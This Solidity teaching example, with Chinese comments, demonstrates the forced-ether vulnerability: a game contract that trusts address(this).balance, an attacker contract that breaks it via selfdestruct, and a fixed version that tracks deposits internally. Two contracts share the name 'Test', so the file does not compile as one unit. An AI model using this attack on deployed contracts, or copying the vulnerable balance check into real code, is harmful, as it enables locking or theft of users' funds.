```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Test {

    uint public target = 3 ether;
    address public winner;

    function deposit() external payable {
        require(msg.value == 1 ether, "need 1 ether");
        require(address(this).balance <= target, "boom");

        if (address(this).balance == target) {
            winner = msg.sender;
        }
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }
}

contract Attatck {

    address public target;

    constructor(address _addr) {
        target = _addr;
    }

    receive() external payable{}

    function attack() external {
        //使用selfdestruct自毁可以强制转账，不管对方合约有没有receive方法
        selfdestruct(payable(target));
    }
}

contract Test {

    uint public target = 3 ether;
    uint balance;
    address public winner;

    function deposit() external payable {
        require(msg.value == 1 ether, "need 1 ether");
        //使用变量记录deposit值，address(this).balance总是不可靠的，总能被外部强制增加
        balance += msg.value;
        require(balance <= target, "boom");

        if (balance == target) {
            winner = msg.sender;
        }
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }
}
```